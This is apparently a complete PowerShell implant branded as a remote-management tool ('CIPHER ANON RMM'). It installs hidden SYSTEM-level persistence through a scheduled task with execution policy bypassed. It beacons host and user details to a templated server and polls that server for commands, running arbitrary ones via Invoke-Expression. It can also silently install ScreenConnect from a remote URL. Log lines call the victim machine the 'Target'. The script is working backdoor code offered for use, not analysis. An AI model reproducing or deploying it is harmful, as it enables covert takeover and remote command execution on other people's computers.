# ============================================================
# CIPHER ANON RMM v3.0 — SCREENCONNECT ONLY
# ============================================================

$BASE_URL = "{{BASE_URL}}"
$RMM_REPORT_URL = "$BASE_URL/api/rmm/report"
$COMMAND_URL = "$BASE_URL/api/rmm/commands"
$RESPONSE_URL = "$BASE_URL/api/rmm/response"
$SCREENCONNECT_URL = "{{SCREENCONNECT_URL}}"

$RMM_CLIENT_DIR = "$env:PROGRAMDATA\CipherAnonRMM"
$RMM_CLIENT_ID_FILE = "$RMM_CLIENT_DIR\client_id.txt"
$RMM_LOGFILE = "$RMM_CLIENT_DIR\rmm_log.txt"
$RMM_POLL_INTERVAL = 30000

New-Item -ItemType Directory -Path $RMM_CLIENT_DIR -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    Add-Content -Path $RMM_LOGFILE -Value $line
    Write-Host $line
}

Write-Log "============================================"
Write-Log "CIPHER ANON RMM v3.0 — SCREENCONNECT ONLY"
Write-Log "Target: $env:COMPUTERNAME"
Write-Log "============================================"

function Get-RmmClientId {
    if (Test-Path $RMM_CLIENT_ID_FILE) {
        $id = Get-Content $RMM_CLIENT_ID_FILE -Raw
        return $id.Trim()
    }
    $id = [System.Guid]::NewGuid().ToString().Substring(0,8)
    Set-Content -Path $RMM_CLIENT_ID_FILE -Value $id
    return $id
}

function Install-Persistence {
    $taskName = "CipherAnonRMM"
    $scriptPath = $MyInvocation.MyCommand.Path

    $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($task) {
        Write-Log "Scheduled task already exists"
        return
    }

    Write-Log "Creating scheduled task: $taskName"
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
        Write-Log "Scheduled task created"
    } catch {
        Write-Log "Failed to create scheduled task: $_"
    }
}

function Execute-Command {
    param($Command)

    Write-Log "Executing: $Command"

    $result = ""
    $success = $true

    if ($Command -like "install-screenconnect*") {
        Write-Log "Downloading ScreenConnect from $SCREENCONNECT_URL..."
        $installer = "$env:TEMP\sc_installer.msi"
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($SCREENCONNECT_URL, $installer)
        } catch {
            $result = "Download failed"
            $success = $false
            return @{ success = $success; result = $result }
        }
        if (Test-Path $installer) {
            Write-Log "Installing ScreenConnect..."
            Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden
            Remove-Item $installer -Force -ErrorAction SilentlyContinue
            $result = "ScreenConnect installed successfully"

            # Read ScreenConnect server URL from registry
            try {
                $scKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ServerUrl" -ErrorAction SilentlyContinue
                if ($scKey) {
                    $result = $result + " | Server URL: $($scKey.ServerUrl)"
                } else {
                    $scKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\ScreenConnect\Client" -Name "ServerUrl" -ErrorAction SilentlyContinue
                    if ($scKey) {
                        $result = $result + " | Server URL: $($scKey.ServerUrl)"
                    }
                }
            } catch {}

            try {
                $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                if ($scId) {
                    $result = "ScreenConnect installed — Client ID: $($scId.ClientID)"
                }
            } catch {}
        } else {
            $result = "Failed to download ScreenConnect"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "uninstall-rmm") {
        try {
            Unregister-ScheduledTask -TaskName "CipherAnonRMM" -Confirm:$false -ErrorAction SilentlyContinue
            Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
            $result = "RMM uninstalled successfully"
        } catch {
            $result = "Failed to uninstall: $_"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "whoami") {
        $result = $env:USERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "hostname") {
        $result = $env:COMPUTERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "ping") {
        $result = "pong"
        return @{ success = $true; result = $result }
    }

    if ($Command -like "restart") {
        $result = "Restarting system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'"
        return @{ success = $true; result = $result }
    }

    if ($Command -like "shutdown") {
        $result = "Shutting down system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'"
        return @{ success = $true; result = $result }
    }

    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        $result = $output
        $success = $true
    } catch {
        $result = "Unknown command or error: $_"
        $success = $false
    }

    return @{ success = $success; result = $result }
}

$clientId = Get-RmmClientId
Write-Log "Client ID: $clientId"
Install-Persistence

try {
    $reportData = @{
        clientId = $clientId
        pcName = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-WmiObject Win32_OperatingSystem).Caption
        status = "online"
        timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        rmmInstalled = $true
        rmmType = "CipherAnonRMM"
    }
    $reportJson = $reportData | ConvertTo-Json -Depth 5
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
    $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $req.Timeout = 10000
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Log "Registered with server"
} catch {
    Write-Log "Registration failed: $_"
}

Write-Log "Starting RMM background loop..."

$scriptBlock = {
    $BASE_URL = "{{BASE_URL}}"
    $RMM_REPORT_URL = "$BASE_URL/api/rmm/report"
    $COMMAND_URL = "$BASE_URL/api/rmm/commands"
    $RESPONSE_URL = "$BASE_URL/api/rmm/response"
    $RMM_CLIENT_DIR = "$env:PROGRAMDATA\CipherAnonRMM"
    $RMM_CLIENT_ID_FILE = "$RMM_CLIENT_DIR\client_id.txt"
    $RMM_LOGFILE = "$RMM_CLIENT_DIR\rmm_log.txt"
    $POLL_INTERVAL = 30000
    $SCREENCONNECT_URL = "{{SCREENCONNECT_URL}}"

    function Write-Log {
        param($Msg)
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $line = "[$timestamp] $Msg"
        Add-Content -Path $RMM_LOGFILE -Value $line
    }

    function Get-ClientId {
        if (Test-Path $RMM_CLIENT_ID_FILE) {
            $id = Get-Content $RMM_CLIENT_ID_FILE -Raw
            return $id.Trim()
        }
        $id = [System.Guid]::NewGuid().ToString().Substring(0,8)
        Set-Content -Path $RMM_CLIENT_ID_FILE -Value $id
        return $id
    }

    function Execute-Command {
        param($Command)

        $result = ""
        $success = $true

        if ($Command -like "install-screenconnect*") {
            $installer = "$env:TEMP\sc_installer.msi"
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.DownloadFile($SCREENCONNECT_URL, $installer)
            } catch {
                $result = "Download failed"
                $success = $false
                return @{ success = $success; result = $result }
            }
            if (Test-Path $installer) {
                Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden
                Remove-Item $installer -Force -ErrorAction SilentlyContinue
                $result = "ScreenConnect installed"
                try {
                    $scKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ServerUrl" -ErrorAction SilentlyContinue
                    if ($scKey) {
                        $result = $result + " | Server URL: $($scKey.ServerUrl)"
                    }
                } catch {}
                try {
                    $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                    if ($scId) {
                        $result = "ScreenConnect — Client ID: $($scId.ClientID)"
                    }
                } catch {}
            } else {
                $result = "Download failed"
                $success = $false
            }
            return @{ success = $success; result = $result }
        }

        if ($Command -like "uninstall-rmm") {
            try {
                Unregister-ScheduledTask -TaskName "CipherAnonRMM" -Confirm:$false -ErrorAction SilentlyContinue
                Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
                $result = "Uninstalled"
            } catch {
                $result = "Failed: $_"
                $success = $false
            }
            return @{ success = $success; result = $result }
        }

        if ($Command -like "whoami") {
            $result = $env:USERNAME
            return @{ success = $true; result = $result }
        }

        if ($Command -like "hostname") {
            $result = $env:COMPUTERNAME
            return @{ success = $true; result = $result }
        }

        if ($Command -like "ping") {
            $result = "pong"
            return @{ success = $true; result = $result }
        }

        if ($Command -like "restart") {
            $result = "Restarting..."
            Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'"
            return @{ success = $true; result = $result }
        }

        if ($Command -like "shutdown") {
            $result = "Shutting down..."
            Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'"
            return @{ success = $true; result = $result }
        }

        try {
            $output = Invoke-Expression $Command 2>&1 | Out-String
            $result = $output
            $success = $true
        } catch {
            $result = "Error: $_"
            $success = $false
        }

        return @{ success = $success; result = $result }
    }

    $clientId = Get-ClientId
    Write-Log "Background loop started (ID: $clientId)"

    while ($true) {
        try {
            $reportData = @{
                clientId = $clientId
                pcName = $env:COMPUTERNAME
                username = $env:USERNAME
                os = (Get-WmiObject Win32_OperatingSystem).Caption
                status = "online"
                timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                rmmInstalled = $true
                rmmType = "CipherAnonRMM"
            }
            $reportJson = $reportData | ConvertTo-Json -Depth 5
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
            $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
            $req.Method = "POST"
            $req.ContentType = "application/json"
            $req.ContentLength = $bytes.Length
            $req.Timeout = 10000
            $stream = $req.GetRequestStream()
            $stream.Write($bytes, 0, $bytes.Length)
            $stream.Close()
            $resp = $req.GetResponse()
            $resp.Close()

            $cmdReq = [System.Net.WebRequest]::Create("$COMMAND_URL/$clientId")
            $cmdReq.Method = "GET"
            $cmdReq.Timeout = 10000
            $cmdResp = $cmdReq.GetResponse()
            $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream())
            $cmdJson = $reader.ReadToEnd()
            $cmdResp.Close()

            if ($cmdJson) {
                $cmdData = $cmdJson | ConvertFrom-Json
                if ($cmdData.command) {
                    Write-Log "Command: $($cmdData.command)"
                    $result = Execute-Command -Command $cmdData.command
                    $responseData = @{
                        clientId = $clientId
                        commandId = $cmdData.id
                        success = $result.success
                        result = $result.result
                        timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                    }
                    $respJson = $responseData | ConvertTo-Json -Depth 5
                    $respBytes = [System.Text.Encoding]::UTF8.GetBytes($respJson)
                    $respReq = [System.Net.WebRequest]::Create("$RESPONSE_URL/$clientId")
                    $respReq.Method = "POST"
                    $respReq.ContentType = "application/json"
                    $respReq.ContentLength = $respBytes.Length
                    $respReq.Timeout = 10000
                    $respStream = $respReq.GetRequestStream()
                    $respStream.Write($respBytes, 0, $respBytes.Length)
                    $respStream.Close()
                    $respResp = $respReq.GetResponse()
                    $respResp.Close()
                }
            }
        } catch {
            $err = $_.Exception.Message
            Write-Log "Loop error: $err"
        }
        Start-Sleep -Milliseconds $POLL_INTERVAL
    }
}

Start-Job -ScriptBlock $scriptBlock
Write-Log "RMM client running"

Write-Log ""
Write-Log "============================================"
Write-Log "RMM CLIENT READY!"
Write-Log "Client ID: $clientId"
Write-Log "Log saved to: $RMM_LOGFILE"
Write-Log "============================================"

exit
